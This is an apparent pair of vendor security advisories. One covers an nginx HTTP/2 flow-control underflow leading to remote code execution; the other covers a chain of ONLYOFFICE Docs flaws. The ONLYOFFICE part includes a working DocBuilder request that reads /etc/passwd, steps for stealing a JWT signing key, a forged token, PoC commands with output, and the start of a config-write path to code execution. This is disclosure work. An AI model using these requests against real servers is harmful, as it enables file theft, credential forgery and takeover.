articles.full_text:
Overview

Today, both Rapid7 and F5 are disclosing CVE-2026-123007, a critical integer underflow vulnerability affecting nginx HTTP/2, which can allow for unauthenticated remote code execution (RCE) against affected servers under certain conditions.

CVE ID

Description

CWE

CVSSv4

CVE-2026-123007

HTTP/2 flow-control memory corruption permitting worker-context RCE

CWE-191 (Integer Underflow)

9.2 (Critical)

nginx can miscalculate how much response data an HTTP/2 client has allowed it to send. A remote, unauthenticated client can exploit this error by cancelling queued response data, then make nginx use an invalid length when copying a later response. The resulting memory corruption can disclose data, interrupt service, and execute code with the nginx worker process's permissions.

Impact

Rapid7 has developed a proof-of-concept to demonstrate leveraging CVE-2026-123007 for unauthenticated RCE against a vulnerable linux/amd64 Docker image running nginx version 1.31.8, as shown below in Figure 1. The target nginx server’s configuration had http2 on and TLS enabled. Note that for brevity, video playback is at 8x speed.

Figure 1: Video demonstrating unauthenticated RCE against NGINX 1.31.8 via CVE-2026-123007

Leveraging CVE-2026-123007 for RCE requires a significant amount of network traffic to be transmitted, approximately 128 GB of HTTP/2 data. Both available network bandwidth and connection timeouts will place practical limitations on Internet exploitation. In the above example shown in Figure 1, exploitation takes two and a half minutes. The approximate timings to transmit the required network data over a 10 Gbit/s network is two minutes, while on a 1 Gbit/s network it is seventeen minutes. Due to nginx’s default one hour connection lifetime, a network slower than approximately 300 Mbit/s will take over the one hour connection limit threshold and will not be able to succeed. Additionally, should an HTTP/2 connection be proxied, the precise attacker-controlled HTTP/2 frames being transmitted will likely not be retransmitted in a way that satisfies exploiting the vulnerability.

Finally, the exploitation strategy developed depends on a specific x86-64 glibc EVEX/YMM memcpy implementation selected at runtime, based on the avx512f and avx512vl CPU features. Alternative RCE exploitation strategies may be viable, but none are currently known.

Credit

This vulnerability was discovered by Stephen Fewer, Senior Principal Security Researcher at Rapid7, and is being disclosed in accordance with Rapid7's vulnerability disclosure policy.

Technical analysis

The version of nginx tested was a linux/amd64 Docker image for nginx version 1.31.8 (nginx@sha256:5ab5b0b01097420873a3f3330f44248e34a3c2a3e8d5ee30658aeae8cb7435da), and ran with an exposed HTTPS service and http2 enabled.

How a client controls HTTP/2 response data

HTTP/2 carries messages called frames over a connection. Each request and response belongs to a numbered stream, so one connection can carry several exchanges at once. Response-body bytes are carried in DATA frames.

For this vulnerability, nginx is the sender and the remote client is the receiver. The client grants nginx permission, or flow-control credit, to send a certain number of DATA bytes. nginx tracks the remaining credit in two counters: one for each stream and one shared by the connection. Sending DATA must be permitted by both counters. These HTTP/2 counters are separate from TCP's receive window.

The client grants more credit by sending a WINDOW_UPDATE frame containing a positive increment. A stream identifier of zero increases the connection’s send credit. A nonzero stream identifier increases the send credit for the stream with that specific nonzero identifier. HTTP/2 limits the increment and the resulting window to 2^31-1 bytes, or 2,147,483,647 (0x7FFFFFFF). This report calls that maximum MAX.

The client can also send a SETTINGS frame containing a SETTINGS_INITIAL_WINDOW_SIZE parameter. This changes the starting credit for new streams. nginx must also adjust each active stream's remaining credit by the difference between the old and new setting values. It does not change the connection's credit. A reduction can therefore leave an active stream with negative credit until the client grants more. The connection window has no equivalent reduction: it must remain between zero and MAX. RFC 9113, section 6.9 defines these limits and the required errors.

nginx stores the connection counter in h2c->send_window, where h2c is the HTTP/2 connection record. Its size_t type is an unsigned integer: on the verified 64-bit build it can hold values from zero to 2^64-1. The size_t type can therefore hold values above HTTP/2's maximum connection window of 2^31-1 bytes (MAX). nginx must enforce that protocol limit in its own logic.

// src/http/v2/ngx_http_v2.h #define NGX_HTTP_V2_MAX_WINDOW ((1U << 31) - 1) // <--- [1] struct ngx_http_v2_connection_s { // ... size_t send_window; // <--- [2] // ... }; struct ngx_http_v2_stream_s { // ... ssize_t send_window; // ... };

The rule that the connection counter at [2] must never exceed MAX at [1] is the connection-window invariant. The separate stream counter, stream->send_window, is explicitly declared as ssize_t, a signed 64-bit integer on the verified build. That allows SETTINGS_INITIAL_WINDOW_SIZE to make a stream's credit temporarily negative. The connection counter remains unsigned. The later unsafe conversion occurs when the output filter treats excessive connection credit as a signed 64-bit off_t response length.

Leveraging vulnerability has four main stages:

By slowing its reading of server output, the client keeps selected DATA frames queued and unstarted. It raises the connection's credit to MAX and the selected streams' credit to just below MAX. A SETTINGS frame that increases SETTINGS_INITIAL_WINDOW_SIZE enough to exceed the stream limit makes nginx close those streams while leaving the connection usable. Request cleanup then restores the reserved credit above MAX.

An unsigned subtraction in the next connection WINDOW_UPDATE check underflows. Repeated accepted WINDOW_UPDATE frames can then raise the counter into the upper half of its 64-bit range without requiring the addition to wrap.

On the verified 64-bit build, nginx interprets that excessive counter as a negative response length and creates an invalid buffer. Buffered TLS output then passes a huge unsigned byte count to the memory-copy function memcpy, causing out-of-bounds reads and writes.

These constrained memory accesses depend on the build and selected copy routine. With a suitable memory layout, an attacker can use disclosed addresses and controlled overwrites to execute code with the nginx worker process's permissions.

Cancelling queued DATA restores too much credit

When nginx queues a DATA frame at [3], it subtracts the frame's DATA length from the connection's credit counter at [4] and then from the stream's credit counter. This reserves the credit before the bytes reach the client and prevents other streams from spending the same connection credit:

// src/http/v2/ngx_http_v2_filter_module.c // ngx_http_v2_send_chain() // ... ngx_http_v2_queue_frame(h2c, frame); // <--- [3] h2c->send_window -= frame_size; // <--- [4] stream->send_window -= frame_size; stream->queued++;

An attacker can keep a later response queued by slowing or stopping its reading of earlier server output. Once the transport cannot accept more output, nginx must wait. This condition is transport backpressure. The attacker needs enough of it to keep the selected DATA frame unstarted: none of that frame's bytes have yet entered TLS output or the socket. Stopping response reads does not prevent the client from sending control frames in the other direction.

While the DATA remains queued, the client sends a connection WINDOW_UPDATE that raises nginx's reduced counter to MAX. The problem appears when the request that owns the queued DATA then closes. Its request-cleanup handler removes the unstarted DATA and returns the reserved credit:

// src/http/v2/ngx_http_v2_filter_module.c // ngx_http_v2_filter_cleanup() // ... for ( ;; ) { frame = *fn; if (frame == NULL) { break; } if (frame->stream == stream && !frame->blocked) { // <--- [5] *fn = frame->next; window += frame->length; // <--- [6] if (--stream->queued == 0) { break; } continue; } fn = &frame->next; } // ... h2c->send_window += window; // <--- [7]

The test at [5] selects removable, unstarted frames for that request. The local variable window totals their DATA lengths at [6]. The addition at [7] does not check whether restoring those bytes takes the connection counter above MAX.

For example, restoring 1,393 bytes after the counter has reached 2,147,483,647 (0x7FFFFFFF) produces 2,147,485,040 (0x80000570). This value is invalid under HTTP/2 as it exceeds MAX, although it still fits in a 64-bit size_t; the addition has not yet wrapped around. The unchecked restoration at [7] is the first invalid state in the vulnerability. The attacker still needs a way to close the selected requests while preserving the connection, so the excessive counter can be used again.

A SETTINGS error closes the stream but leaves the connection usable

When a SETTINGS frame increases SETTINGS_INITIAL_WINDOW_SIZE enough that an active stream's credit would exceed MAX, nginx terminates that stream but leaves the HTTP/2 connection usable. A client can create this condition by first sending a stream WINDOW_UPDATE to put the selected stream just below MAX. It then sends a SETTINGS frame that increases the initial stream-window setting. For example, changing the setting from 65,535 to 65,537 adds two bytes to every active stream. A stream already at MAX-1 would become MAX+1, even though the new setting value itself is allowed.

RFC 9113 requires this condition to end the connection with FLOW_CONTROL_ERROR. nginx instead calls ngx_http_v2_terminate_stream() for each affected stream. That function sends RST_STREAM, which ends an individual stream, and causes the request to be cleaned up. The loop then continues using the same connection:

// src/http/v2/ngx_http_v2.c // ngx_http_v2_adjust_windows() // ... if (delta > 0 && stream->send_window > (ssize_t) (NGX_HTTP_V2_MAX_WINDOW - delta)) { if (ngx_http_v2_terminate_stream(h2c, stream, NGX_HTTP_V2_FLOW_CTRL_ERROR) == NGX_ERROR) { return NGX_ERROR; } continue; // <--- [8] }

Here, delta is the difference between the new and old setting values. Request cleanup performs [5] through [7], while continue at [8] leaves the HTTP/2 connection open. The attacker can now send further frames on the connection whose credit has exceeded MAX.

The next WINDOW_UPDATE causes an integer underflow

When another connection WINDOW_UPDATE arrives, nginx tries to calculate how much additional credit is still allowed:

// src/http/v2/ngx_http_v2.c // ngx_http_v2_state_window_update() // ... if (window > NGX_HTTP_V2_MAX_WINDOW - h2c->send_window) { // <--- [9] // ... return ngx_http_v2_connection_error(h2c, NGX_HTTP_V2_FLOW_CTRL_ERROR); } h2c->send_window += window; // <--- [10]

In this function, window is the increment received from the client. The subtraction at [9] is safe only while the stored counter is no greater than MAX. If cleanup has restored R excess bytes, the intended allowance is MAX - (MAX + R), or -R. Unsigned arithmetic cannot represent that negative result. On the verified 64-bit build it wraps to 2^64 - R, a very large positive number. This is the integer underflow identified by CWE-191.

The incorrect allowance lets further client increments pass the check. By sending many increments, each no greater than MAX, the client can raise the counter to 2^63 or above without wrapping the addition itself, shown at [10] above. Such a value has the top bit of its 64-bit representation set. It is still an unsigned value, but it no longer fits in a signed 64-bit integer. That distinction matters when nginx prepares the next response.

This amplification accounts for the large traffic requirement. A connection WINDOW_UPDATE occupies 13 HTTP/2 bytes: a nine-byte frame header and a four-byte payload. The credit granted by that frame is not data actually transmitted. Starting from the small over-credit state described above, reaching 2^63 by maximum-size increments takes about 2^32 frames, or 52 GiB. Reaching the near-2^64 values used for the confirmed read/write path takes about 2^33 increments, or 104 GiB. nginx also limits control-frame traffic relative to other received data. The current code-execution reproduction sends about 15 GiB of additional request-header traffic to stay within that limit, bringing its reported plaintext total to about 119.02 GiB. TLS and network overhead increase the actual wire traffic. These figures describe this 64-bit amplification route, not a universal minimum for every possible exploit.

Excessive credit becomes a negative response length

The client can make an active stream with available credit process an ordinary response body. nginx's HTTP/2 output filter decides how many body bytes to include in a DATA frame. Before following that calculation, it is useful to define the buffer it will create.

An in-memory nginx buffer is described by a ngx_buf_t record. Its pos pointer is the memory address of the next byte to send. Its last pointer is the address immediately after the available data. For four available bytes, last must be four bytes after pos; subtracting pos from last gives the length, four. A valid buffer therefore cannot have last before pos. nginx links these buffer records together into an output chain, which is a list of data waiting to be sent.

In ngx_http_v2_send_chain(), the byte limit is an off_t, a signed 64-bit integer on the verified build. The excessive unsigned connection counter is converted to that signed type at [11]. On this build, a value of 2^64 - d, where d is a small positive byte count, becomes -d:

// src/http/v2/ngx_http_v2_filter_module.c // ngx_http_v2_send_chain() // ... if (limit == 0 || limit > (off_t) h2c->send_window) { limit = h2c->send_window; // <--- [11] } if (limit > stream->send_window) { limit = (stream->send_window > 0) ? stream->send_window : 0; } // ... if ((off_t) frame_size > limit) { frame_size = (size_t) limit; // <--- [12] } // ... rest = frame_size; while ((off_t) rest >= size) { // <--- [13] // ... } if (rest) { cl = ngx_http_v2_filter_get_shadow(stream, in->buf, offset, rest); // <--- [14] // ... }

The stream-window check does not reject a negative limit: it only reduces a limit that is too large. At [12], the negative limit becomes a huge unsigned frame_size. Casting the same value back to off_t makes it negative again, so [13] skips the loop that would normally consume and bound the available body bytes. At [14], nginx passes the invalid length to a helper whose size parameter is also a signed off_t.

That helper creates a shadow buffer: a new metadata record referring to part of the existing response data, without copying the response body itself. It sets the new end pointer using the supplied length:

// src/http/v2/ngx_http_v2_filter_module.c // ngx_http_v2_filter_get_shadow() static ngx_chain_t * ngx_http_v2_filter_get_shadow(ngx_http_v2_stream_t *stream, ngx_buf_t *buf, off_t offset, off_t size) { // ... ngx_memcpy(chunk, buf, sizeof(ngx_buf_t)); // ... if (ngx_buf_in_memory(chunk)) { chunk->pos += offset; chunk->last = chunk->pos + size; // <--- [15] } // ... }

Because size is negative, [15] places last before pos. The response body has not become larger; its buffer metadata is now invalid. The next output stage trusts that metadata.

Buffered TLS output copies beyond the buffers

For buffered TLS output, ngx_ssl_send_chain() gathers bytes from the output chain into a temporary staging buffer before encryption. It calculates each input buffer's length using last - pos. The invalid buffer produces a negative signed length at [16]:

// src/event/ngx_event_openssl.c // ngx_ssl_send_chain() // ... ssize_t send, size, file_size; // ... size = in->buf->last - in->buf->pos; // <--- [16] if (size > buf->end - buf->last) { size = buf->end - buf->last; } if (send + size > limit) { size = (ssize_t) (limit - send); } // ... ngx_memcpy(buf->last, in->buf->pos, size); // <--- [17] buf->last += size; in->buf->pos += size;

Both checks only reduce lengths that are too large. Neither rejects a negative length. memcpy takes an unsigned size_t byte count, so [17] converts -d back into the huge value 2^64-d. The actual source and destination buffers are far smaller. This is where the invalid connection credit first reaches an out-of-bounds native memory access.

A copy that actually traversed such an enormous range would normally encounter inaccessible memory and crash the worker. In the tested x86-64 glibc implementation, however, certain lengths just below 2^64 cause the machine-level end-address calculations to wrap (Please see Addendum A below for more details on this unexpected behavior). For a length of 2^64-d, adding the length to a start address can produce an address d bytes before it. The optimized copy uses these end addresses in its loop conditions, so it can finish after a limited number of reads and writes that reach outside the intended buffers. The copy can return if all locations it actually accesses are accessible; other lengths, memory layouts, or copy implementations can fault immediately. If it returns, nginx also moves both buffer positions backward by the negative signed length.

Exploitation

The invalid copy can both read and overwrite worker memory. It does not give the client an HTTP/2 field in which it can simply choose any memory address. The useful addresses depend on where nginx allocated the response and TLS buffers, how much output is already buffered, and which copy routine the C library selected. These are constrained read and write capabilities, not an unconditional arbitrary read or write.

After creating the invalid DATA buffer, ngx_http_v2_send_chain() updates its position in the original response and records the bytes that remain to be sent:

// src/http/v2/ngx_http_v2_filter_module.c // ngx_http_v2_send_chain() // ... offset += rest; // <--- [18] size -= rest; // ... if (offset) { cl = ngx_http_v2_filter_get_shadow(stream, in->buf, offset, size); // <--- [19] // ... in->buf = cl->buf; // ... }

Here, offset is the position within the original body and size is its remaining length. Starting at offset zero, the same unsigned value representing -d makes [18] move the offset backward by d and increase the remaining length by d on the verified build. The shadow buffer created at [19] therefore has a positive length, but starts d bytes before the original response and ends at its original end. If the oversized copy and connection survive, later ordinary DATA frames can carry those preceding bytes to the client through TLS. They can include pointers into the heap, where nginx dynamically allocates request data, or into loaded libraries. Those pointers disclose addresses that address-space layout randomization (ASLR) would otherwise hide.

On the write side, nginx stores client-supplied request data in heap allocations. With a suitable allocation layout, the oversized copy can pick up those attacker-selected bytes and replace fields in a nearby live heap object. One useful field is a callback: a stored function pointer that nginx intends to call later. An attacker who knows the relevant process addresses and can overwrite that field may redirect normal nginx processing to existing executable code. The overwrite need not contain new machine code. This explains the general route from disclosed addresses and controlled bytes to code execution; it does not claim that every build exposes the same object or callback. Execution has the worker's permissions; execution as the master process or root has not been established.

The proof-of-concept first recovers heap addresses and pointers into nginx and the GNU C Library (glibc) from memory preceding the original response body. It uses those addresses and the overwrite to forge nginx request and response-buffer objects that return selected parts of glibc's loaded image over HTTP/2. The returned ELF metadata is parsed to resolve system() despite ASLR, then a request-pool cleanup callback is redirected to invoke an attacker-chosen command.

Addendum A: Why an oversized memcpy can return

The TLS copy via ngx_memcpy (shown at [17] above) receives a byte count of 2^64-d, where d is a small positive distance. A routine that actually traversed that entire range would normally fault. This addendum explains why one optimized glibc implementation can instead finish after a limited number of out-of-bounds accesses.

glibc chooses among optimized copy routines according to the CPU's capabilities. The tested x86-64 routine uses EVEX/YMM instructions, which can move 32 bytes at a time. In the corresponding glibc 2.41 source, the EVEX wrapper includes a shared memcpy/memmove implementation, and its vector configuration sets VEC_SIZE to 32. A vector is the block of bytes handled by one such instruction.

The following excerpt uses AT&T assembly syntax, in which the source operand comes first. The CPU register %rdi holds the original destination address, called D below; %rsi holds the source address, Q; and %rdx holds the byte count, n. One route enters this backward-copy branch when D and Q are different and the unsigned difference D-Q is smaller than n. This includes the ordinary case where D is above Q and n is close to the unsigned 64-bit maximum.

// glibc 2.41: sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S // Function: CPU-selected memcpy implementation, backward-copy branch // ... L(more_8x_vec_backward): // ... leaq (VEC_SIZE * -4 + -1)(%rdi, %rdx), %rcx // <--- [20] // ... andq $-(VEC_SIZE), %rcx // <--- [21] // ... L(loop_4x_vec_backward): // ... load and store four 32-byte vectors addq $(VEC_SIZE * -4), %rcx // <--- [22] cmpq %rcx, %rdi // <--- [23] jb L(loop_4x_vec_backward) // ... store the previously loaded leading and trailing vectors VZEROUPPER_RETURN // <--- [24]

The full glibc assembly source shows the omitted loads and stores. At [20], leaq calculates an address without reading memory. Its 64-bit result keeps only the low 64 bits. At [21], andq rounds that address down to a 32-byte boundary. Calling the resulting destination address cursor, the calculation is:

cursor = align_down_32((D + n - 129) modulo 2^64) = align_down_32(D - d - 129), when n = 2^64-d

Here, align_down_32 means rounding down to the nearest address divisible by 32; it is explanatory notation, not a glibc function. For an ordinary heap address and a small d, the calculated cursor is already below D.

The loop starts by copying one 128-byte block. Instruction [22] then moves the cursor backward by another 128 bytes. The comparison and unsigned jump at [23] repeat the loop only while D < cursor. Because the cursor is already below D, the jump is not taken. The routine writes its remaining leading and trailing vectors, then returns at [24]. It has not copied the enormous requested range: the wrapped address has made the loop stop after a small set of accesses. Those accesses can still read and overwrite memory outside the actual buffers.

articles.title: From view-only access to container root: five vulnerabilities in ONLYOFFICE Docs (FIXED)
articles.context: Exploitation Reading a server file The attacker submits a DocBuilder script using a JWT issued for view-only access to any document
articles.full_text:
Overview

As part of our research into Zimbra Collaboration Suite, Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as root inside the official DocumentServer container.

The findings also expose server files and document data that the viewer never displays, even when downloading is disabled.

CVE

Finding

CVSS

CVE-2026-113627

DocBuilder native file read and Session JWT forgery

7.1 High

CVE-2026-110385

DocBuilder SaveFile conversion parameter injection and code execution

8.7 High

CVE-2026-97727

Complete-save format path traversal and arbitrary file write

6.5 Medium

CVE-2026-113630

Root-helper command injection

7.8 High

CVE-2026-113631

View-only export of non-rendered document data

6.5 Medium

ONLYOFFICE confirmed on October 23, 2026 that all five findings were fixed in Document Server 10.0. The changelog describes the release's security changes.

Proof-of-concept code is available on the accompanying Github repository.

Product description

ONLYOFFICE Docs provides online viewers and editors for documents, spreadsheets, presentations, forms and PDFs. It supports collaborative editing and can integrate with applications that store and share files.

An integrating application, for example Zimbra Collaboration Suite, supplies an opening configuration identifying the document and the user's permissions, signed with the Browser key. This client-visible credential is referred to below as the Editor JWT. After opening a document, DocumentServer issues a Session JWT for reconnecting and saving.

Incoming service requests, including document-building jobs, are validated using ONLYOFFICE's Inbox JWT key. DocumentServer can also send generated document output to the integrating application's callback URL.

Credit

This assessment and the exploit-chain research were conducted by Jonah Burgess (CryptoCat), Senior Security Researcher at Rapid7. The findings are being disclosed in accordance with Rapid7's vulnerability disclosure policy.

Testing setup

Rapid7 tested the official onlyoffice/documentserver:9.4.0 image with package onlyoffice-documentserver 9.4.0-129. DocumentServer ran as the ds account. JWT validation remained enabled, and no authentication check, private-address filter, or vendor code was disabled or modified. Browser and Inbox validation used the same effective signing key.

Our analysis of the vendor supplied fixes compares the v9.4.0.129 and v10.0.0.169 tags of ONLYOFFICE/server, ONLYOFFICE/core and ONLYOFFICE/document-server-package. Rapid7 also performed targeted checks on package 10.0.0-169. For the conditional WOPI test on 9.4.0-129, Rapid7 enabled only WOPI_ENABLED=true and left the shipped WOPI IP filter unchanged at its default allow-all rule.

Exploitation was demonstrated only on 9.4.0-129; the broader affected-version range is unknown.

Impact

View-only document access can lead to command execution as ds and then root inside the official container. The two exploit chains use different file-write stages. With WOPI enabled and an attacker-controlled source reachable and permitted by its IP filter, the same DocBuilder authorization failure provides an unauthenticated entry.

Separately, a viewer denied download can obtain a reconstructed DOCX containing custom XML, custom properties and field instructions that the viewer never displayed.

Editor JWT authorizes native file reads and session JWT forgery (CVE-2026-113627)

An attacker with view-only access to a document can use /docbuilder to steal files from the ONLYOFFICE server. In the tested build, this exposed the Session JWT signing key, allowing the attacker to forge credentials containing document keys and permissions that were never granted to the original viewer.

Technical analysis

Prerequisite: The attacker needs a valid Editor JWT for any document and access to /docbuilder. Target files must be readable by ds. The token-forgery step also requires the Session JWT signing key to be in a readable file, as it was in the tested build. No edit, download, print, review, or comment permission is required.

The default-secret branch in getTenantSecret() contains:

switch (type) { case commonDefines.c_oAscSecretType.Browser: case commonDefines.c_oAscSecretType.Inbox: res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key break; // ... other token types omitted ... }

The branch at [0] selects the same configured signing key for Browser and Inbox tokens.

builderRequest() passes the request to getRequestParams():

const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation if (authRes.isDecoded) { cmd.setWithAuthorization(true); }

At [1], builderRequest() delegates JWT validation to getRequestParams(). That function's query-token branch checks the signature using the Inbox key:

if (tenTokenEnableRequestInbox) { res.code = constants.VKEY; let checkJwtRes; if (res.params.token) { // [2] Inbox signature check checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox); } else { checkJwtRes = yield checkJwtHeader(ctx, req); } // ... remaining validation and decoded-claim handling omitted ... }

A view-only Editor JWT passes the signature check at [2] because Browser validation uses the same key. The check does not require the JWT to have been issued specifically for DocBuilder.

/docbuilder treats the POST body as a DocBuilder script. After the JWT check above succeeds, that script can call GetFontBinary() with a supplied filename:

std::wstring sFile = file->toStringW(); bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\') || std::wstring::npos != sFile.find('/')); if (bIsFullFilePath) { bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check } // ... font-map fallback omitted ... return CJSContext::createUint8Array(sFile); // [4] Return file bytes

GetFontBinary() accepts an existing absolute path at [3] and returns its bytes at [4]. Ssani4 previously reported this native file-read behavior in DocumentBuilder issue #147 on November 21, 2025. That report explicitly identified GetFontBinary() and ZipFileAsString() and used a Session JWT obtained from /downloadas to authorize /docbuilder. ONLYOFFICE closed the issue as fixed in DocumentBuilder 9.2.0.

Rapid7 reproduced GetFontBinary() file reads in 9.4.0-129 using a view-only Editor JWT, then demonstrated session-signing-key theft and token forgery. The native read itself was previously reported; the analysis here documents its continued exposure through that entry point and its role in the subsequent chains.

Exploitation

Reading a server file

The attacker submits a DocBuilder script using a JWT issued for view-only access to any document. The request fragment is:

POST /docbuilder?token=VIEW_ONLY_EDITOR_JWT HTTP/1.1 Host: docs.example.test Content-Type: application/octet-stream builder.CreateFile("docx"); var bytes = native.GetFontBinary("/etc/passwd"); if (bytes === null || typeof bytes === "undefined") throw new Error("read failed"); var hex = ""; for (var i = 0; i < bytes.length; i++) hex += ("0" + bytes[i].toString(16)).slice(-2); var paragraph = Api.CreateParagraph(); paragraph.AddText("R7FILE:" + hex + ":END"); Api.GetDocument().Push(paragraph); builder.SaveFile("docx", "stolen.docx"); builder.CloseFile();

DocumentServer executes the script as ds and returns a URL for stolen.docx. The PoC downloads stolen.docx, extracts the hex between R7FILE: and :END from word/document.xml, and decodes it to recover the contents of /etc/passwd. Hex encoding supports binary files; the delimiters let the extractor locate the payload and reject output missing either boundary.

Stealing the session signing key

The attacker repeats the same request for /etc/onlyoffice/documentserver/local.json. In the tested configuration, services.CoAuthoring.secret.session.string contained the Session JWT signing key. If services.CoAuthoring.secret.session.file instead names a key file, the attacker reads that file with the same GetFontBinary() request.

Forging a save credential

The attacker chooses the document key, permissions and user ID, then signs the following claims with the stolen Session JWT key using HMAC-SHA256. For this save operation, the user ID does not need to correspond to an existing account:

{ "document": { "key": "external-document-20260821", "permissions": { "download": true, "print": true } }, "editorConfig": { "user": { "id": "rapid7-poc", "index": 1 } }, "iat": 1787329293, "exp": 1787329593 }

The attacker submits a normal SAVE_TYPE_PART_START request using the forged JWT and an attacker-chosen document key. DocumentServer returns a server-generated save key, proving that it accepts the forged credential and its ungranted document permissions.

PoC

The file-read and JWT-forgery PoC uses a view-only Editor JWT to read /etc/passwd, steal the Session JWT signing key and verify a forged token for an attacker-chosen document key:

python3 pocs/editor_token_docbuilder_jwt_forgery.py \ --documentserver https://docs.example.test \ --token-file /secure/view-only.jwt \ --read-file /etc/passwd \ --read-output /tmp/stolen-passwd \ --document-key external-document-20260821 \ --output-token /tmp/forged-session.jwt \ --timeout 180

Output excerpt:

[+] read 1220 bytes from /etc/passwd to /tmp/stolen-passwd [+] forged session JWT accepted for document key: external-document-20260821 (save key _7717) [+] forged JWT written to: /tmp/forged-session.jwt [+] forged JWT (expires at Unix time 1787329593): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb2N1bWVudCI6eyJrZXkiOiJleHRlcm5hbC1kb2N1bWVudC0yMDI2MDgyMSIsInBlcm1pc3Npb25zIjp7ImRvd25sb2FkIjp0cnVlLCJwcmludCI6dHJ1ZX19LCJlZGl0b3JDb25maWciOnsidXNlciI6eyJpZCI6InJhcGlkNy1wb2MiLCJpbmRleCI6MX19LCJpYXQiOjE3ODczMjkyOTMsImV4cCI6MTc4NzMyOTU5M30.VlXcl09_669zHtwiJFZDLFRtQbi_HTt7zncmPYUHLww

The file recovered to the attacker's machine contained the target's account data:

$ head -n 5 /tmp/stolen-passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync

The JWT printed above was signed with the key recovered from local.json. DocumentServer accepted that signature during the normal save-key reservation:

{"status":"ok","data":"_7717"}

Impact

The attacker can steal any file readable by ds. On the tested system, this included the Session JWT signing key, allowing the attacker to create credentials with document keys and permissions that were never granted to the original viewer. DocumentServer accepted the forged JWT for a save operation under a new document key. The demonstrated unauthorized save accounts for the low integrity impact in the 7.1 High score.

The same editor-JWT authorization failure also allowed a view-only user to supply a private-network URL to Api.CreateImage(). DocumentServer fetched the URL and returned a decodable image inside a generated DOCX. This narrower consequence shares the authorization root cause above and is not treated as a separate finding.

Fix

In 10.0.0-169, builderRequest() now tells the token validator that this is a DocBuilder request:

-const authRes = yield docsCoServer.getRequestParams(ctx, req); +authRes = yield docsCoServer.getRequestParams(ctx, req, constants.JWT_PURPOSE_DOCBUILDER);

With the default settings, the new check rejects tokens containing document-opening fields such as editorConfig and WOPI fileInfo, even if their signatures are valid. This blocks reuse of a view-only Editor JWT at /docbuilder, as confirmed in the 10.0.0-169 test.

DocBuilder conversion parameter injection enables code execution (CVE-2026-110385)

A DocBuilder script can replace the source path, destination path, and formats chosen by DocumentServer, extracting attacker-controlled files into any existing directory writable by ds. In the tested release, extracting a log4js appender and runtime configuration into the Data directory causes DocService to load and execute attacker code without a restart.

Technical analysis

Prerequisite: The attacker needs a request accepted by /docbuilder. The destination directory must already exist and be writable by ds. Immediate process execution additionally requires a writable directory containing a runtime configuration watched by DocService; the default Data directory in the tested official image met this condition.

The DocBuilder text-script dispatcher in CDocBuilder::RunTextA() forwards the optional third builder.SaveFile() argument without restricting it to supported conversion options:

const wchar_t* sParams = NULL; if (nCountParameters > 2) sParams = _builder_params[2].c_str(); // [0] Caller-supplied XML // [1] Forward conversion parameters int nSaveError = this->SaveFile(nFormat, _builder_params[1].c_str(), sParams);

The third argument at [0] reaches the private save implementation unchanged at [1].

CDocBuilder_Private::SaveFile() XML-encodes its own source and destination paths, but then appends the attacker string as raw XML:

oBuilder.WriteString(L"<?xml version=\"1.0\" encoding=\"utf-8\"?><TaskQueueDataConvert><m_sFileFrom>"); oBuilder.WriteEncodeXmlString(m_sFileDir); // [2] Encode source path oBuilder.WriteString(sFileBin + L"</m_sFileFrom><m_sFileTo>"); oBuilder.WriteEncodeXmlString(_path); // [3] Encode destination path oBuilder.WriteString(L"</m_sFileTo><m_nFormatTo>"); oBuilder.WriteString(std::to_wstring(type)); // ... remaining server-generated fields omitted ... if (!sConvertionParams.empty()) { oBuilder.WriteString(sConvertionParams); // [4] Append raw XML }

The paths at [2] and [3] are XML-encoded, but the raw XML appended at [4] can introduce duplicate task fields after the server-generated values.

X2T's InputParams parser processes elements sequentially and replaces an existing value whenever the same name appears again:

else if (_T("m_sFileFrom") == sName) { RELEASEOBJECT(m_sFileFrom); m_sFileFrom = new std::wstring(sValue); // [5] Replace source path } else if (_T("m_sFileTo") == sName) { RELEASEOBJECT(m_sFileTo); m_sFileTo = new std::wstring(sValue); // [6] Replace destination path } else if (_T("m_nFormatFrom") == sName) { RELEASEOBJECT(m_nFormatFrom); m_nFormatFrom = new int(XmlUtils::GetInteger(sValue)); // [7] Replace source format } else if (_T("m_nFormatTo") == sName) { RELEASEOBJECT(m_nFormatTo); m_nFormatTo = new int(XmlUtils::GetInteger(sValue)); // [8] Replace destination format }

Assignments [5]–[8] let later XML elements replace the server-selected paths and formats. getConversionDirection() maps source format 2057 (AVS_OFFICESTUDIO_FILE_OTHER_ZIP) and destination format 0 (AVS_OFFICESTUDIO_FILE_UNKNOWN) to the directory-extraction operation:

else if (AVS_OFFICESTUDIO_FILE_OTHER_ZIP == nFormatFrom && AVS_OFFICESTUDIO_FILE_UNKNOWN == nFormatTo) eRes = TCD_UNZIPDIR; // [9] Directory extraction mode

The extraction mode selected at [9] reaches x2t()'s conversion dispatcher, which uses both attacker-selected paths without containment validation:

case TCD_UNZIPDIR: { result = zip2dir(sFileFrom, sFileTo); // [10] Extract archive } break;

zip2dir() at [10] reads the attacker-selected archive and extracts it into the selected directory writable by ds.

Writing DocService's runtime configuration provides a route from this file write to code execution. runtimeConfigManager watches the configuration directory and automatically reloads runtime.json when it is created or changed, passing its attacker-controlled log options to the logger:

getConfig(operationContext.global) .then(config => { logger.configureLogger(config?.log?.options); // [11] Reload logging options })

Those options reach configureLogger() at [11]; the function merges them with the cached configuration before calling log4js:

function configureLogger(options) { const mergedOptions = config.util.extendDeep({}, cachedLogConfig, options); log4js.configure(mergedOptions); // [12] Apply log4js configuration }

The configuration applied at [12] sets the appender type to the extracted JavaScript module's absolute path. The log4js 6.9.1 appender loader passes non-core types to require(), executing that module in DocService.

Preparing the payload files

To run id, the inner ZIP named r7-NONCE.zip contains r7-appender-NONCE.js:

And runtime.json:

